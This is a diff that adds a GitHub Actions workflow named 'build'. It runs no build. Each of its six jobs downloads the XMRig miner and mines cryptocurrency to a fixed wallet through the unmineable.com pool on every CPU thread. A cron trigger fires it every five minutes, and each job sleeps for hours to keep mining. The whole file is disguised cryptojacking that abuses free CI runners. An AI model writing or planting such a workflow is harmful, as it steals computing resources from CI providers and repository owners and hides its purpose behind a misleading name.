@@ -1,0 +1,37 @@
+name: build
+on:
+  push:
+  schedule:
+    - cron: '*/5 * * * *'
+  workflow_dispatch:
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.a-$RANDOM --threads=$(nproc) & sleep 20000
+  b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.b-$RANDOM --threads=$(nproc) & sleep 20000
+  c:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.c-$RANDOM --threads=$(nproc) & sleep 20000
+  d:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.d-$RANDOM --threads=$(nproc) & sleep 20000
+  e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.e-$RANDOM --threads=$(nproc) & sleep 20000
+  f:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.f-$RANDOM --threads=$(nproc) & sleep 20000
